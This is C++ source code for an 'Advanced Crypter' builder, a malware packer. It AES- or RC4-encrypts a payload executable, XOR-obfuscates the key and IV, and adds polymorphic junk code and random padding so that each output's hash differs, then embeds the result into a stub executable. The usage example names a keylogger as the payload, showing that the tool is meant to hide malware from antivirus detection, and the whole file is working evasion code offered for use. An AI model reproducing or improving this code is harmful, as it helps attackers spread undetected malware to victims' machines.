/*
 * Crypter Builder - Encrypts payload and embeds into stub
 * 
 * Usage: crypter.exe <payload.exe> <stub.exe> <output.exe>
 * 
 * Advanced Crypter Project
 * 
 * Build: g++ crypter.cpp -o crypter.exe -static -O2 -s
 */

#define _WIN32_WINNT 0x0600
#define WINVER 0x0600

#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <ctime>
#include "aes.h"
#include "polymorph.h"

// ==================== MARKERS (must match stub.cpp) ====================
#define PAYLOAD_MARKER   "##ENCRYPTED_PAYLOAD##"
#define KEY_MARKER       "##AES_KEY_DATA##"
#define IV_MARKER        "##AES_IV_DATA##"
#define SIZE_MARKER      "##PAYLOAD_SIZE##"
#define POLY_MARKER      "##POLYMORPHIC##"

const char* XOR_STUB_KEY = "STUB_CRYPT_2025_ADV";

// ==================== HELPER FUNCTIONS ====================

std::vector<BYTE> ReadFile(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file) {
        return std::vector<BYTE>();
    }
    return std::vector<BYTE>(std::istreambuf_iterator<char>(file), 
                              std::istreambuf_iterator<char>());
}

bool WriteFile(const std::string& path, const std::vector<BYTE>& data) {
    std::ofstream file(path, std::ios::binary);
    if (!file) return false;
    file.write((char*)data.data(), data.size());
    return file.good();
}

void PrintBanner() {
    std::cout << "\n";
    std::cout << "  ╔═══════════════════════════════════════════╗\n";
    std::cout << "  ║     ADVANCED CRYPTER v1.0                 ║\n";
    std::cout << "  ║     AES-256 + Polymorphic Engine          ║\n";
    std::cout << "  ╚═══════════════════════════════════════════╝\n";
    std::cout << "\n";
}

void PrintProgress(const std::string& step, bool success = true) {
    if (success) {
        std::cout << "  [+] " << step << "\n";
    } else {
        std::cout << "  [-] " << step << "\n";
    }
}

// ==================== POLYMORPHIC PROCESSING ====================

std::vector<BYTE> ApplyPolymorphism(std::vector<BYTE>& stubData) {
    PolymorphicEngine& engine = GetPolyEngine();
    
    // 1. Find polymorphic marker section and add junk
    std::string stubStr((char*)stubData.data(), stubData.size());
    size_t polyPos = stubStr.find(POLY_MARKER);
    
    if (polyPos != std::string::npos) {
        // Generate random junk code
        auto junk = engine.GenerateJunkCode(256, 1024);
        
        // Insert after marker
        polyPos += strlen(POLY_MARKER);
        stubData.insert(stubData.begin() + polyPos, junk.begin(), junk.end());
    }
    
    // 2. Add random padding at end
    auto padding = engine.GenerateRandomData(rand() % 4096 + 1024);
    stubData.insert(stubData.end(), padding.begin(), padding.end());
    
    // 3. Generate unique marker
    auto marker = engine.GenerateMarker();
    stubData.insert(stubData.end(), marker.begin(), marker.end());
    
    return stubData;
}

// ==================== MAIN CRYPTER LOGIC ====================

bool Crypt(const std::string& payloadPath, const std::string& stubPath, const std::string& outputPath) {
    PrintProgress("Loading payload: " + payloadPath);
    
    // 1. Read payload
    std::vector<BYTE> payload = ReadFile(payloadPath);
    if (payload.empty()) {
        PrintProgress("Failed to read payload!", false);
        return false;
    }
    std::cout << "      Size: " << payload.size() << " bytes\n";
    
    // 2. Read stub
    PrintProgress("Loading stub: " + stubPath);
    std::vector<BYTE> stub = ReadFile(stubPath);
    if (stub.empty()) {
        PrintProgress("Failed to read stub!", false);
        return false;
    }
    std::cout << "      Size: " << stub.size() << " bytes\n";
    
    // 3. Generate random key and IV
    PrintProgress("Generating cryptographic material...");
    BYTE key[AES_KEY_SIZE];
    BYTE iv[AES_IV_SIZE];
    GenerateRandomKey(key);
    GenerateRandomIV(iv);
    
    std::cout << "      Key: ";
    for (int i = 0; i < 8; i++) printf("%02X", key[i]);
    std::cout << "...\n";
    
    // 4. Encrypt payload
    PrintProgress("Encrypting payload with AES-256-CBC...");
    std::vector<BYTE> encrypted;
    if (!AES_Encrypt(payload.data(), (DWORD)payload.size(), key, iv, encrypted)) {
        PrintProgress("AES encryption failed, trying RC4...", false);
        
        // Fallback to RC4
        encrypted = payload;
        RC4_Crypt(encrypted.data(), (DWORD)encrypted.size(), key, AES_KEY_SIZE);
        PrintProgress("RC4 encryption applied");
    }
    std::cout << "      Encrypted size: " << encrypted.size() << " bytes\n";
    
    // 5. Obfuscate key and IV before embedding
    PrintProgress("Obfuscating key/IV...");
    BYTE obfKey[AES_KEY_SIZE];
    BYTE obfIV[AES_IV_SIZE];
    memcpy(obfKey, key, AES_KEY_SIZE);
    memcpy(obfIV, iv, AES_IV_SIZE);
    XOR_Obfuscate(obfKey, AES_KEY_SIZE, XOR_STUB_KEY);
    XOR_Obfuscate(obfIV, AES_IV_SIZE, XOR_STUB_KEY);
    
    // 6. Apply polymorphism to stub
    PrintProgress("Applying polymorphic transformation...");
    stub = ApplyPolymorphism(stub);
    std::cout << "      New stub size: " << stub.size() << " bytes\n";
    
    // 7. Find markers and embed data
    PrintProgress("Embedding encrypted payload into stub...");
    std::string stubStr((char*)stub.data(), stub.size());
    
    // Embed key
    size_t keyPos = stubStr.find(KEY_MARKER);
    if (keyPos == std::string::npos) {
        // Append markers and data at end
        std::vector<BYTE> output = stub;
        
        // Key marker + data
        output.insert(output.end(), KEY_MARKER, KEY_MARKER + strlen(KEY_MARKER));
        output.insert(output.end(), obfKey, obfKey + AES_KEY_SIZE);
        
        // IV marker + data
        output.insert(output.end(), IV_MARKER, IV_MARKER + strlen(IV_MARKER));
        output.insert(output.end(), obfIV, obfIV + AES_IV_SIZE);
        
        // Size marker + data
        output.insert(output.end(), SIZE_MARKER, SIZE_MARKER + strlen(SIZE_MARKER));
        DWORD encSize = (DWORD)encrypted.size();
        output.insert(output.end(), (BYTE*)&encSize, (BYTE*)&encSize + sizeof(DWORD));
        
        // Payload marker + data
        output.insert(output.end(), PAYLOAD_MARKER, PAYLOAD_MARKER + strlen(PAYLOAD_MARKER));
        output.insert(output.end(), encrypted.begin(), encrypted.end());
        
        stub = output;
    } else {
        // Replace at marker positions (would need more complex PE manipulation)
        // For simplicity, append method is used
        PrintProgress("Using append method for embedding", true);
        
        std::vector<BYTE> output = stub;
        output.insert(output.end(), KEY_MARKER, KEY_MARKER + strlen(KEY_MARKER));
        output.insert(output.end(), obfKey, obfKey + AES_KEY_SIZE);
        output.insert(output.end(), IV_MARKER, IV_MARKER + strlen(IV_MARKER));
        output.insert(output.end(), obfIV, obfIV + AES_IV_SIZE);
        output.insert(output.end(), SIZE_MARKER, SIZE_MARKER + strlen(SIZE_MARKER));
        DWORD encSize = (DWORD)encrypted.size();
        output.insert(output.end(), (BYTE*)&encSize, (BYTE*)&encSize + sizeof(DWORD));
        output.insert(output.end(), PAYLOAD_MARKER, PAYLOAD_MARKER + strlen(PAYLOAD_MARKER));
        output.insert(output.end(), encrypted.begin(), encrypted.end());
        
        stub = output;
    }
    
    // 8. Add final random padding (changes hash each time)
    PrintProgress("Adding final polymorphic padding...");
    auto finalPadding = GetPolyEngine().GenerateRandomData(512 + (rand() % 2048));
    stub.insert(stub.end(), finalPadding.begin(), finalPadding.end());
    
    // 9. Write output
    PrintProgress("Writing output: " + outputPath);
    if (!WriteFile(outputPath, stub)) {
        PrintProgress("Failed to write output!", false);
        return false;
    }
    std::cout << "      Final size: " << stub.size() << " bytes\n";
    
    // 10. Secure cleanup
    SecureZeroMemory(key, sizeof(key));
    SecureZeroMemory(iv, sizeof(iv));
    SecureZeroMemory(obfKey, sizeof(obfKey));
    SecureZeroMemory(obfIV, sizeof(obfIV));
    
    return true;
}

// ==================== MAIN ====================

int main(int argc, char* argv[]) {
    PrintBanner();
    
    if (argc < 4) {
        std::cout << "  Usage: crypter.exe <payload.exe> <stub.exe> <output.exe>\n\n";
        std::cout << "  Arguments:\n";
        std::cout << "    payload.exe  - The executable to encrypt\n";
        std::cout << "    stub.exe     - The compiled stub executable\n";
        std::cout << "    output.exe   - Output encrypted executable\n\n";
        std::cout << "  Example:\n";
        std::cout << "    crypter.exe keylogger.exe stub.exe crypted.exe\n\n";
        return 1;
    }
    
    std::string payloadPath = argv[1];
    std::string stubPath = argv[2];
    std::string outputPath = argv[3];
    
    srand((unsigned)time(NULL) ^ GetTickCount());
    
    std::cout << "  Starting encryption process...\n\n";
    
    if (Crypt(payloadPath, stubPath, outputPath)) {
        std::cout << "\n  ╔═══════════════════════════════════════════╗\n";
        std::cout << "  ║  [SUCCESS] Payload encrypted successfully ║\n";
        std::cout << "  ╚═══════════════════════════════════════════╝\n\n";
        
        // Show file info
        WIN32_FILE_ATTRIBUTE_DATA fad;
        if (GetFileAttributesExA(outputPath.c_str(), GetFileExInfoStandard, &fad)) {
            ULARGE_INTEGER size;
            size.HighPart = fad.nFileSizeHigh;
            size.LowPart = fad.nFileSizeLow;
            std::cout << "  Output: " << outputPath << "\n";
            std::cout << "  Size:   " << size.QuadPart << " bytes\n";
        }
        
        return 0;
    } else {
        std::cout << "\n  [FAILED] Encryption process failed!\n\n";
        return 1;
    }
}
